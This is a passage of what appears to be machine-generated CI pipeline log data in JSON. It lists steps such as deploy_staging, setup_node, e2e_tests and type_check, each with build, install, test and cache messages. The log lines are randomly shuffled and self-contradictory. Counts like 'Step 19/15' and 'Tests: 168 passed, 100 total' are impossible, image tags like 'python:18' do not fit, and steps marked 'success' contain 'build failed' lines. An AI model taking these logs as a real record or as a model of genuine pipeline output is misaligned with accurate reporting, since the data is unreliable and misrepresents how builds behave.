          "Artifact uploaded: build.tar.gz (19MB)",
          "Pushing to registry...",
          "Connection established",
          "[12:19:30] DEBUG: Initializing service",
          "[12:19:30] WARN: Deprecated API usage",
          "[12:19:30] ERROR: Connection failed",
          "yarn add: Done in 17.53s",
          "Checking out develop branch",
          "  PASS: integration/test_auth_login.spec.js",
          "Image pulled successfully",
          "npm notice: package.json updated",
          "POST /upload - 201 (478ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:19:30] INFO: Starting build process",
          "npm notice: package.json updated",
          "Step 6/18: Deploying",
          "Artifact uploaded: build.tar.gz (15MB)",
          "[12:19:30] DEBUG: Loading configuration",
          "Step 14/18: Running migrations",
          "Building Docker image...",
          "Waiting...",
          "Installing webpack@3.10.0",
          "WARNING: express has known vulnerabilities",
          "[12:19:30] INFO: Cache refreshed",
          "Step 11/15: Running migrations",
          "Cache invalidated: node_modules",
          "Step 19/15: Building",
          "Pushing to registry...",
          "  PASS: test_api_health (50ms)",
          "Uploading artifact 'coverage' (37 files)",
          "[12:19:30] INFO: Starting build process",
          "[12:19:30] DEBUG: Memory usage: 984MB",
          "Minifying main.js",
          "Compiling utils/handler.rs...",
          "[12:19:30] INFO: Request completed",
          "Optimizing 91 modules...",
          "Platform: darwin-arm64",
          "Step 17/21: Deploying",
          "Transforming 951 files...",
          "pip: Installing build dependencies...",
          "Step 4/15: Deploying",
          "pip: Collecting webpack",
          "Done.",
          "Transforming 522 files...",
          "Cache miss for key-9277",
          "Done.",
          "[12:19:30] WARN: Deprecated API usage",
          "Snapshots: 48 passed, 0 total",
          "[12:19:30] DEBUG: Memory usage: 467MB",
          "Minifying main.js",
          "Waiting...",
          "Coverage: 92% statements, 70% branches",
          "\u2713 package completed",
          "Using Python 3.12",
          "Success!",
          "\u2713 Step 'install' succeeded",
          "Using Node.js 14.6.1",
          "Test Suites: 11 passed, 10 total",
          "Connecting to example.com:443...",
          "Building Docker image...",
          "Ready.",
          "pip: Collecting express",
          "Layer 3/9: COPY command",
          "Connection established",
          "Compiling lib/app.ts...",
          "Processing...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Completed.",
          "[12:19:30] DEBUG: Memory usage: 233MB",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Processing...",
          "Step 6/17: Installing dependencies",
          "Artifact uploaded: dist.zip (10MB)",
          "\u2713 All checks passed",
          "Platform: darwin-arm64",
          "[12:19:30] INFO: Request completed",
          "Step 19/18: Deploying",
          "\u2713 Step 'install' succeeded",
          "Step 5/25: Testing",
          "Time: 83.461s",
          "pip install: Successfully installed jest-5.17",
          "Environment: production",
          "Using Python 3.11",
          "pip install: Successfully installed webpack-3.4",
          "\u2713 test completed",
          "[12:19:30] INFO: Connecting to database",
          "Finished.",
          "GET /api - 200 (61ms)",
          "Step 16/17: Testing",
          "[12:19:30] DEBUG: Connection pool: 4 active",
          "Loading...",
          "Coverage: 75% statements, 94% branches",
          "Cache miss for key-4510",
          "npm install: added 208 packages",
          "FAILED: test_user_create",
          "Connecting to acme.corp:443...",
          "Processing...",
          "Artifact downloaded: 8MB",
          "NODE_ENV=development",
          "HEAD is now at 1943e2f",
          "\u2713 Step 'build' succeeded",
          "\u2713 Task completed in 3416ms",
          "\u2717 build failed with exit code 122",
          "pip: Collecting lodash",
          "Cache restored successfully (79MB)",
          "[12:19:30] WARN: Deprecated API usage",
          "OK",
          "NODE_ENV=development",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Ran 55 tests in 44s",
          "Using Python 3.12",
          "Pulling image: python:18",
          "Creating production build...",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-11-21T12:20:32.394174",
        "finished_at": "2025-11-21T12:20:40.133719",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Connecting to test.io:443...",
          "Waiting...",
          "Success!",
          "pip: Installing build dependencies...",
          "Cache hit for key-6654",
          "Loading...",
          "npm notice: package.json updated",
          "Coverage: 96% statements, 75% branches",
          "Building Docker image...",
          "Uploading artifact 'dist' (17 files)",
          "NODE_ENV=test",
          "GET /api - 201 (39ms)",
          "Image pulled successfully",
          "yarn add: Done in 10.80s",
          "Time: 6.362s",
          "pip: Downloading prettier-2.20.tar.gz",
          "Compiling utils/utils.go...",
          "Step 10/17: Linting",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:19:30] DEBUG: Memory usage: 1539MB",
          "Test Suites: 8 passed, 39 total",
          "POST /data - 201 (105ms)",
          "Finished.",
          "Step 14/15: Building",
          "  PASS: test_cache_hit (353ms)",
          "Finished.",
          "WARNING: express has known vulnerabilities",
          "Compiling src/main.py...",
          "Bundling vendor.css",
          "\u2713 Task completed in 2979ms",
          "Test Suites: 46 passed, 29 total",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "npm notice: created a lockfile",
          "[12:19:30] INFO: Request completed",
          "[12:19:30] INFO: Cache refreshed",
          "yarn add: Done in 8.92s",
          "Step 10/15: Building",
          "Time: 41.321s",
          "Step 5/25: Testing",
          "Done.",
          "Transforming 706 files...",
          "Artifact uploaded: build.tar.gz (35MB)",
          "POST /api - 200 (149ms)",
          "GET /health - 204 (28ms)",
          "pip install: Successfully installed axios-2.9",
          "\u2713 Task completed in 463ms",
          "Snapshots: 1 passed, 43 total",
          "Bundling vendor.css",
          "Step 5/22: Running migrations",
          "NODE_ENV=test",
          "Bundling styles.css",
          "Layer 7/14: ENV command",
          "Step 2/20: Installing dependencies",
          "HEAD is now at f4dee0b",
          "Pushing to registry...",
          "[12:19:30] WARN: Deprecated API usage",
          "Optimizing 36 modules...",
          "Bundling main.css",
          "\u2717 build failed with exit code 103",
          "Ran 112 tests in 10s",
          "Connection established",
          "Image pulled successfully",
          "[12:19:30] WARN: Deprecated API usage",
          "Loading...",
          "Finished.",
          "[12:19:30] DEBUG: Query executed in 69ms",
          "Cache hit for key-1283",
          "Connection established",
          "Step 8/17: Linting",
          "[12:19:30] DEBUG: Loading configuration",
          "Layer 4/14: COPY command",
          "Compiling utils/service.java...",
          "Connection established",
          "Fetching submodules...",
          "Success!",
          "Finished.",
          "[12:19:30] INFO: Request completed",
          "Verifying...",
          "\u2713 All checks passed",
          "Compiling components/handler.rs...",
          "Building Docker image...",
          "Cache hit for key-1583",
          "Switched to branch 'feature/task-504'",
          "FAILED: test_cache_hit",
          "Compiling components/service.java...",
          "Environment: development",
          "[12:19:30] INFO: Starting build process",
          "Checking out main branch",
          "Tests: 168 passed, 100 total",
          "[12:19:30] DEBUG: Loading configuration",
          "Optimizing 84 modules...",
          "[12:19:30] DEBUG: Loading configuration",
          "WARNING: express has known vulnerabilities",
          "Time: 37.777s",
          "Environment: test",
          "[12:19:30] INFO: Starting build process",
          "Creating production build...",
          "\u2713 package completed",
          "Using Node.js 20.9.4",
          "yarn add: Done in 6.68s",
          "WARNING: axios has known vulnerabilities",
          "Test Suites: 40 passed, 50 total",
          "pip: Downloading axios-1.17.tar.gz",
          "Cache miss for key-4057",
          "Compiling components/main.py...",
          "Verifying...",
          "pip: Downloading jest-5.5.tar.gz",
          "Cache saved successfully",
          "pip: Downloading jest-5.8.tar.gz",
          "Coverage: 94% statements, 60% branches",
          "Finished.",
          "Transforming 370 files...",
          "[12:19:30] WARN: Deprecated API usage",
          "Done.",
          "Switched to branch 'feature/task-259'",
          "Artifact uploaded: build.tar.gz (8MB)",
          "npm install: resolved 1447 packages",
          "Already up to date.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Fetching submodules...",
          "Minifying app.js",
          "Switched to branch 'bugfix/task-314'",
          "Success!",
          "GET /status - 201 (90ms)",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Processing...",
          "npm install: resolved 935 packages",
          "pip: Collecting axios",
          "Compiling components/main.py...",
          "Cache restored successfully (53MB)",
          "HEAD is now at fee43f6",
          "Artifact uploaded: build.tar.gz (5MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Verifying...",
          "Waiting...",
          "Time: 46.147s",
          "[12:19:30] INFO: Processing request",
          "Connecting to startup.dev:443...",
          "Creating production build...",
          "[12:19:30] ERROR: Connection failed",
          "\u2713 Task completed in 3171ms",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-11-21T12:20:40.133719",
        "finished_at": "2025-11-21T12:20:47.873264",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Connection established",
          "Cache hit for key-6955",
          "[12:19:30] WARN: Deprecated API usage",
          "\u2713 Step 'build' succeeded",
          "Done.",
          "[12:19:30] INFO: Cache refreshed",
          "pip: Downloading webpack-3.20.tar.gz",
          "Step 13/19: Deploying",
          "pip: Installing build dependencies...",
          "GET /status - 200 (1ms)",
          "[12:19:30] INFO: Cache refreshed",
          "Verifying...",
          "Pulling image: python:3.11",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/utils.go...",
          "Artifact uploaded: dist.zip (64MB)",
          "Building Docker image...",
          "Completed.",
          "TLS handshake completed",
          "Step 10/19: Deploying",
          "Finished.",
          "Artifact uploaded: dist.zip (4MB)",
          "Checking out master branch",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "WARNING: axios has known vulnerabilities",
          "Creating production build...",
          "Checking out master branch",
          "Creating production build...",
          "Fetching submodules...",
          "Building Docker image...",
          "Using Python 3.9",
          "Artifact uploaded: dist.zip (57MB)",
          "Artifact uploaded: dist.zip (90MB)",
          "Using Node.js 20.4.10",
          "Success!",
          "Ready.",
          "Loading...",
          "Step 6/20: Deploying",
          "Cache hit for key-9823",
          "Success!",
          "Already up to date.",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Verifying...",
          "pip: Downloading axios-2.20.tar.gz",
          "Loading...",
          "Fetching submodules...",
          "npm notice: created a lockfile",
          "Image pulled successfully",
          "Image pulled successfully",
          "Waiting...",
          "\u2713 Task completed in 4476ms",
          "[12:19:30] INFO: Starting build process",
          "Fetching submodules...",
          "Already up to date.",
          "Transforming 284 files...",
          "Snapshots: 24 passed, 49 total",
          "[12:19:30] DEBUG: Initializing service",
          "TLS handshake completed",
          "\u2713 build completed",
          "Cache miss for key-5086",
          "FAILED: test_db_connect",
          "Cache hit for key-8162",
          "Cache hit for key-2792",
          "Ran 24 tests in 50s",
          "npm notice: created a lockfile",
          "Bundling main.css",
          "Coverage: 75% statements, 94% branches",
          "Image pulled successfully",
          "Time: 40.531s",
          "\u2713 Step 'test' succeeded",
          "Cache hit for key-4845",
          "Snapshots: 30 passed, 32 total",
          "Creating production build...",
          "[12:19:30] INFO: Cache refreshed",
          "Connection established",
          "pip: Collecting react",
          "Connecting to cloud.services:443...",
          "pip: Installing build dependencies...",
          "Switched to branch 'hotfix/task-317'",
          "Done.",
          "Processing...",
          "Compiling lib/main.py...",
          "[12:19:30] DEBUG: Connection pool: 15 active",
          "Connecting to acme.corp:443...",
          "Artifact uploaded: dist.zip (91MB)",
          "[12:19:30] INFO: Request completed",
          "  PASS: unit/test_auth_login.spec.js",
          "[12:19:30] INFO: Connecting to database",
          "[12:19:30] INFO: Processing request",
          "Connecting to test.io:443...",
          "Environment: test",
          "Already up to date.",
          "Cache restored successfully (403MB)",
          "Done.",
          "Pulling image: node:3.11",
          "[12:19:30] DEBUG: Initializing service",
          "pip: Downloading axios-1.1.tar.gz",
          "Step 4/17: Building",
          "Step 18/19: Running migrations",
          "[12:19:30] DEBUG: Connection pool: 18 active",
          "Snapshots: 40 passed, 49 total",
          "Step 14/23: Testing",
          "npm notice: created a lockfile",
          "[12:19:30] INFO: Request completed",
          "Cache saved successfully",
          "Already up to date.",
          "Optimizing 81 modules...",
          "OK",
          "Connection established",
          "Ready.",
          "[12:19:30] INFO: Cache refreshed",
          "TLS handshake completed",
          "Tests: 137 passed, 413 total",
          "TLS handshake completed",
          "Waiting...",
          "Finished.",
          "Cache hit for key-5461",
          "Processing...",
          "Tests: 323 passed, 374 total",
          "Artifact downloaded: 12MB",
          "Done.",
          "Uploading artifact 'build' (27 files)",
          "[12:19:30] INFO: Request completed",
          "[12:19:30] INFO: Request completed",
          "npm install: resolved 227 packages",
          "Connection established",
          "  PASS: unit/test_cache_hit.spec.js",
          "\u2713 build completed",
          "npm install: added 435 packages",
          "Cache invalidated: node_modules",
          "GET /api - 204 (24ms)",
          "FAILED: test_db_connect",
          "pip: Collecting eslint",
          "[12:19:30] WARN: Deprecated API usage",
          "  PASS: e2e/test_cache_hit.spec.js",
          "npm install: added 33 packages",
          "Platform: win32-x64",
          "Step 4/19: Linting",
          "Finished.",
          "Optimizing 40 modules...",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-11-21T12:20:47.873264",
        "finished_at": "2025-11-21T12:20:55.612809",
        "log_lines": [
          "=== Step: setup_node ===",
          "Compiling utils/utils.go...",
          "\u2713 Task completed in 4396ms",
          "pip: Collecting react",
          "Connecting to test.io:443...",
          "pip install: Successfully installed webpack-3.4",
          "Snapshots: 37 passed, 48 total",
          "Cache restored successfully (148MB)",
          "GET /status - 201 (33ms)",
          "Platform: win32-x64",
          "Artifact downloaded: 32MB",
          "Already up to date.",
          "Creating production build...",
          "Ran 62 tests in 57s",
          "Compiling utils/main.py...",
          "Minifying app.js",
          "Transforming 985 files...",
          "Cache miss for key-7702",
          "npm notice: package.json updated",
          "\u2713 deploy completed",
          "Installing eslint@4.12.1",
          "\u2713 Task completed in 4980ms",
          "Connecting to acme.corp:443...",
          "npm install: added 240 packages",
          "Platform: darwin-arm64",
          "Pushing to registry...",
          "Time: 94.190s",
          "OK",
          "[12:19:30] INFO: Connecting to database",
          "Creating production build...",
          "WARNING: react has known vulnerabilities",
          "Step 8/21: Running migrations",
          "Success!",
          "[12:19:30] INFO: Starting build process",
          "Done.",
          "pip: Downloading eslint-5.15.tar.gz",
          "Minifying app.js",
          "Artifact downloaded: 5MB",
          "Snapshots: 23 passed, 47 total",
          "Checking out main branch",
          "Bundling runtime.js",
          "Coverage: 77% statements, 73% branches",
          "Installing react@1.9.4",
          "Cache saved successfully",
          "Ran 16 tests in 6s",
          "Tests: 167 passed, 300 total",
          "\u2717 build failed with exit code 21",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 7/22: Running migrations",
          "Optimizing 32 modules...",
          "Checking out master branch",
          "  PASS: e2e/test_auth_login.spec.js",
          "Step 14/21: Installing dependencies",
          "Switched to branch 'bugfix/task-702'",
          "WARNING: webpack has known vulnerabilities",
          "WARNING: prettier has known vulnerabilities",
          "[12:19:30] INFO: Processing request",
          "Already up to date.",
          "pip: Collecting webpack",
          "Pushing to registry...",
          "\u2713 validate completed",
          "Finished.",
          "\u2713 Task completed in 4324ms",
          "Image pulled successfully",
          "pip: Collecting express",
          "Time: 17.117s",
          "Fetching submodules...",
          "Creating production build...",
          "[12:19:30] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Already up to date.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Using Node.js 17.5.7",
          "[12:19:30] INFO: Connecting to database",
          "npm notice: package.json updated",
          "Platform: win32-x64",
          "[12:19:30] INFO: Cache refreshed",
          "Building Docker image...",
          "Artifact downloaded: 45MB",
          "GET /api - 200 (11ms)",
          "Step 13/18: Linting",
          "[12:19:30] ERROR: Connection failed",
          "[12:19:30] DEBUG: Initializing service",
          "Fetching submodules...",
          "\u2713 Step 'build' succeeded",
          "Cache saved successfully",
          "\u2713 Task completed in 4942ms",
          "Building Docker image...",
          "pip: Downloading lodash-1.7.tar.gz",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Cache miss for key-2982",
          "pip: Downloading react-4.12.tar.gz",
          "[12:19:30] INFO: Cache refreshed",
          "Transforming 837 files...",
          "[12:19:30] INFO: Cache refreshed",
          "Environment: staging",
          "Waiting...",
          "[12:19:30] ERROR: Connection failed",
          "Generating source maps...",
          "Artifact downloaded: 33MB",
          "Compiling utils/app.ts...",
          "Compiling lib/app.ts...",
          "npm install: added 59 packages",
          "Loading...",
          "Test Suites: 18 passed, 30 total",
          "Compiling lib/handler.rs...",
          "[12:19:30] INFO: Request completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Ran 119 tests in 6s",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Tests: 247 passed, 205 total",
          "[12:19:30] DEBUG: Initializing service",
          "NODE_ENV=test",
          "Environment: development",
          "WARNING: react has known vulnerabilities",
          "NODE_ENV=test",
          "Success!",
          "[12:19:30] ERROR: Connection failed",
          "[12:19:30] INFO: Cache refreshed",
          "Checking out develop branch",
          "npm install: added 260 packages",
          "Cache hit for key-7578",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Exception: TypeError",
          "Building Docker image...",
          "TLS handshake completed",
          "Step 19/17: Deploying",
          "Cache invalidated: dependencies",
          "Done.",
          "Verifying...",
          "Platform: win32-x64",
          "[12:19:30] DEBUG: Query executed in 82ms",
          "Minifying vendor.js",
          "Loading...",
          "TLS handshake completed",
          "Exception: TypeError",
          "Step 18/23: Linting",
          "Artifact downloaded: 16MB",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "POST /data - 200 (208ms)",
          "[12:19:30] INFO: Request completed",
          "Pushing to registry...",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-11-21T12:20:55.612809",
        "finished_at": "2025-11-21T12:21:03.352354",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "WARNING: prettier has known vulnerabilities",
          "[12:19:30] DEBUG: Connection pool: 8 active",
          "Already up to date.",
          "[12:19:30] INFO: Request completed",
          "Optimizing 21 modules...",
          "Compiling components/main.py...",
          "Done.",
          "pip: Collecting webpack",
          "Tests: 320 passed, 79 total",
          "Artifact downloaded: 48MB",
          "Success!",
          "yarn add: Done in 13.3s",
          "WARNING: prettier has known vulnerabilities",
          "Step 20/19: Building",
          "\u2713 Step 'setup' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:19:30] DEBUG: Memory usage: 1060MB",
          "Installing lodash@4.15.4",
          "Connecting to example.com:443...",
          "Generating source maps...",
          "\u2713 All checks passed",
          "Optimizing 33 modules...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Building Docker image...",
          "[12:19:30] INFO: Request completed",
          "yarn add: Done in 7.52s",
          "[12:19:30] INFO: Cache refreshed",
          "[12:19:30] INFO: Request completed",
          "Cache miss for key-6521",
          "Test Suites: 21 passed, 35 total",
          "Creating production build...",
          "Artifact downloaded: 4MB",
          "Fetching submodules...",
          "Time: 36.78s",
          "npm install: added 144 packages",
          "[12:19:30] ERROR: Connection failed",
          "[12:19:30] INFO: Processing request",
          "Artifact downloaded: 15MB",
          "Cache invalidated: node_modules",
          "Cache invalidated: build",
          "[12:19:30] INFO: Cache refreshed",
          "POST /data - 202 (428ms)",
          "Installing webpack@3.9.1",
          "\u2713 Task completed in 539ms",
          "WARNING: prettier has known vulnerabilities",
          "Compiling src/app.ts...",
          "Platform: linux-x64",
          "Done.",
          "GET /api - 200 (52ms)",
          "npm notice: created a lockfile",
          "Step 4/15: Testing",
          "Step 4/20: Deploying",
          "Time: 47.99s",
          "Snapshots: 35 passed, 2 total",
          "Compiling lib/app.ts...",
          "Success!",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Connection established",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Transforming 903 files...",
          "Compiling src/service.java...",
          "\u2713 deploy completed",
          "Cache hit for key-2000",
          "pip install: Successfully installed react-2.13",
          "Compiling utils/app.ts...",
          "  PASS: e2e/test_auth_login.spec.js",
          "NODE_ENV=development",
          "Already up to date.",
          "OK",
          "\u2717 build failed with exit code 117",
          "Cache hit for key-5931",
          "\u2713 Task completed in 4279ms",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 Task completed in 3074ms",
          "WARNING: prettier has known vulnerabilities",
          "POST /data - 200 (194ms)",
          "Artifact downloaded: 22MB",
          "Tests: 491 passed, 55 total",
          "[12:19:30] INFO: Starting build process",
          "Snapshots: 21 passed, 13 total",
          "FAILED: test_auth_login",
          "Checking out main branch",
          "Optimizing 94 modules...",
          "Cache invalidated: dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Step 13/18: Running migrations",
          "Switched to branch 'bugfix/task-339'",
          "WARNING: express has known vulnerabilities",
          "Step 2/19: Deploying",
          "  PASS: integration/test_db_connect.spec.js",
          "Step 5/21: Running migrations",
          "Done.",
          "Completed.",
          "Step 16/15: Running migrations",
          "Uploading artifact 'coverage' (14 files)",
          "Step 20/25: Deploying",
          "[12:19:30] DEBUG: Connection pool: 3 active",
          "Verifying...",
          "pip install: Successfully installed react-5.4",
          "Cache restored successfully (397MB)",
          "Compiling src/index.js...",
          "Switched to branch 'bugfix/task-331'",
          "\u2713 All checks passed",
          "[12:19:30] INFO: Cache refreshed",
          "[12:19:30] DEBUG: Memory usage: 1650MB",
          "pip: Collecting prettier",
          "Environment: test",
          "Installing webpack@2.17.6",
          "Step 8/23: Building",
          "pip: Downloading prettier-2.7.tar.gz",
          "Transforming 884 files...",
          "Finished.",
          "[12:19:30] INFO: Starting build process",
          "Uploading artifact 'coverage' (4 files)",
          "[12:19:30] DEBUG: Memory usage: 1534MB",
          "Step 7/16: Deploying",
          "Bundling main.js",
          "[12:19:30] INFO: Request completed",
          "pip: Installing build dependencies...",
          "Finished.",
          "pip: Collecting express",
          "Test Suites: 8 passed, 37 total",
          "\u2717 build failed with exit code 71",
          "WARNING: react has known vulnerabilities",
          "Step 15/19: Deploying",
          "Pulling image: python:3.11",
          "Cache miss for key-2866",
          "Platform: win32-x64",
          "[12:19:30] DEBUG: Connection pool: 7 active",
          "Waiting...",
          "\u2713 All checks passed",
          "Step 2/19: Building",
          "Using Python 3.11",
          "Pulling image: alpine:latest",
          "\u2713 test completed",
          "Image pulled successfully",
          "Compiling components/main.py...",
          "Compiling lib/app.ts...",
          "Environment: development",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-21T12:21:03.352354",
        "finished_at": "2025-11-21T12:21:07.996081",
        "log_lines": [
          "=== Step: save_cache ===",
          "Compiling components/index.js...",
          "Environment: production",
          "[12:19:30] DEBUG: Initializing service",
          "Cache miss for key-3280",
          "  PASS: e2e/test_auth_login.spec.js",
          "\u2713 Step 'test' succeeded",
          "Done.",
          "Verifying...",
          "Pulling image: python:latest",
          "Image pulled successfully",
          "\u2713 Task completed in 733ms",
          "Compiling utils/main.py...",
          "Cache saved successfully",
          "HEAD is now at 7197acd",
          "Finished.",
          "Cache saved successfully",
          "Connecting to acme.corp:443...",
          "Step 5/23: Testing",
          "pip: Installing build dependencies...",
          "pip: Collecting lodash",
          "Completed.",
          "Switched to branch 'bugfix/task-788'",
          "Cache saved successfully",
          "npm notice: created a lockfile",
          "[12:19:30] INFO: Connecting to database",
          "Fetching submodules...",
          "[12:19:30] DEBUG: Query executed in 72ms",
          "Generating source maps...",
          "Pushing to registry...",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Transforming 521 files...",
          "Cache restored successfully (140MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:19:30] DEBUG: Memory usage: 1275MB",
          "npm notice: created a lockfile",
          "Switched to branch 'hotfix/task-993'",
          "[12:19:30] INFO: Starting build process",
          "Environment: staging",
          "Switched to branch 'bugfix/task-626'",
          "OK",
          "Connecting to example.com:443...",
          "Cache invalidated: node_modules",
          "Success!",
          "Time: 59.693s",
          "Ready.",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 Step 'setup' succeeded",
          "Step 17/25: Linting",
          "Pulling image: alpine:3.11",
          "POST /data - 201 (392ms)",
          "POST /upload - 202 (423ms)",
          "Creating production build...",
          "Waiting...",
          "pip: Collecting lodash",
          "Processing...",
          "Image pulled successfully",
          "Fetching submodules...",
          "Step 18/18: Deploying",
          "POST /data - 201 (194ms)",
          "npm install: resolved 203 packages",
          "Step 15/23: Linting",
          "[12:19:30] INFO: Processing request",
          "Artifact downloaded: 25MB",
          "Connecting to test.io:443...",
          "Step 6/20: Running migrations",
          "Compiling src/main.py...",
          "Cache saved successfully",
          "Completed.",
          "\u2713 Step 'install' succeeded",
          "[12:19:30] WARN: Deprecated API usage",
          "Loading...",
          "Using Python 3.10",
          "Connection established",
          "Loading...",
          "[12:19:30] DEBUG: Initializing service",
          "[12:19:30] INFO: Cache refreshed",
          "Fetching submodules...",
          "GET /health - 201 (47ms)",
          "Artifact uploaded: build.tar.gz (12MB)",
          "npm install: resolved 140 packages",
          "Checking out main branch",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:19:30] INFO: Request completed",
          "Bundling styles.js",
          "\u2713 Step 'install' succeeded",
          "[12:19:30] DEBUG: Connection pool: 2 active",
          "Cache restored successfully (202MB)",
          "\u2717 build failed with exit code 21",
          "Time: 46.188s",
          "Processing...",
          "Artifact uploaded: dist.zip (35MB)",
          "Step 4/15: Building",
          "[12:19:30] INFO: Cache refreshed",
          "[12:19:30] INFO: Request completed",
          "[12:19:30] DEBUG: Initializing service",
          "Step 9/21: Testing",
          "Cache restored successfully (148MB)",
          "Cache saved successfully",
          "Fetching submodules...",
          "Completed.",
          "[12:19:30] INFO: Starting build process",
          "Cache restored successfully (80MB)",
          "[12:19:30] INFO: Request completed",
          "Transforming 975 files...",
          "Step 2/24: Installing dependencies",
          "  PASS: unit/test_api_health.spec.js",
          "Connecting to cloud.services:443...",
          "Already up to date.",
          "Platform: linux-x64",
          "Compiling utils/handler.rs...",
          "\u2713 Step 'test' succeeded",
          "Optimizing 76 modules...",
          "Uploading artifact 'build' (8 files)",
          "Layer 8/13: COPY command",
          "Pulling image: alpine:18",
          "Compiling src/handler.rs...",
          "Test Suites: 32 passed, 24 total",
          "Completed.",
          "Transforming 259 files...",
          "Using Python 3.11",
          "[12:19:30] WARN: Deprecated API usage",
          "Using Python 3.11",
          "Pushing to registry...",
          "pip install: Successfully installed lodash-4.7",
          "Using Node.js 19.3.5",
          "\u2713 Step 'install' succeeded",
          "Transforming 540 files...",
          "Test Suites: 29 passed, 29 total",
          "[12:19:30] INFO: Cache refreshed",
          "Minifying app.js",
          "Artifact downloaded: 22MB",
          "[12:19:30] DEBUG: Query executed in 8ms",
          "\u2713 Task completed in 4140ms",
          "pip install: Successfully installed webpack-1.3",
          "Step 6/24: Installing dependencies",
          "Platform: darwin-arm64",
          "HEAD is now at afc0e68",
          "Installing react@5.15.1",
          "Success!",
          "Done.",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-11-21T12:21:07.996081",
        "finished_at": "2025-11-21T12:21:15.735626",
        "log_lines": [
          "=== Step: type_check ===",
          "Waiting...",
          "Checking out main branch",
          "Compiling utils/utils.go...",
          "[12:19:30] INFO: Request completed",
          "Optimizing 77 modules...",
          "Compiling utils/app.ts...",
          "Step 2/22: Linting",
          "pip: Downloading react-1.2.tar.gz",
          "npm notice: package.json updated",
          "Ready.",
          "[12:19:30] WARN: Deprecated API usage",
          "Cache saved successfully",
          "Compiling utils/main.py...",
          "Compiling components/service.java...",
          "Cache restored successfully (193MB)",
          "Generating source maps...",
          "Using Node.js 14.15.10",
          "\u2713 Step 'build' succeeded",
          "[12:19:30] DEBUG: Loading configuration",
          "Layer 1/14: RUN command",
          "Snapshots: 28 passed, 16 total",
          "Optimizing 58 modules...",
          "Verifying...",
          "[12:19:30] INFO: Processing request",
          "Checking out main branch",
          "Waiting...",
          "[12:19:30] DEBUG: Connection pool: 6 active",
          "Done.",
          "Completed.",
          "Compiling components/service.java...",
          "\u2713 Step 'checkout' succeeded",
          "npm install: resolved 745 packages",
          "Waiting...",
          "Uploading artifact 'coverage' (49 files)",
          "Step 11/19: Installing dependencies",
          "npm install: added 410 packages",
          "Snapshots: 25 passed, 2 total",
          "yarn add: Done in 23.5s",
          "[12:19:30] DEBUG: Connection pool: 4 active",
          "[12:19:30] INFO: Request completed",
          "Already up to date.",
          "\u2713 Task completed in 4084ms",
          "Compiling utils/utils.go...",
          "npm install: resolved 1435 packages",
          "Artifact downloaded: 10MB",
          "[12:19:30] ERROR: Connection failed",
          "Connection established",
          "  PASS: unit/test_cache_hit.spec.js",
          "\u2713 All checks passed",
          "Verifying...",
          "\u2713 Task completed in 306ms",
          "[12:19:30] DEBUG: Initializing service",
          "yarn add: Done in 8.51s",
          "Transforming 230 files...",
          "  PASS: test_cache_hit (344ms)",
          "[12:19:30] WARN: Deprecated API usage",
          "\u2713 Step 'test' succeeded",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Cache restored successfully (113MB)",
          "Building Docker image...",
          "Step 20/16: Building",
          "Step 15/20: Installing dependencies",
          "pip: Downloading prettier-4.12.tar.gz",
          "Processing...",
          "Using Node.js 20.1.8",
          "NODE_ENV=test",
          "[12:19:30] INFO: Request completed",
          "Ran 60 tests in 2s",
          "Using Python 3.9",
          "Image pulled successfully",
          "Minifying vendor.js",
          "Step 16/19: Building",
          "\u2713 All checks passed",
          "Loading...",
          "\u2713 package completed",
          "npm install: added 179 packages",
          "[12:19:30] ERROR: Connection failed",
          "Checking out develop branch",
          "WARNING: prettier has known vulnerabilities",
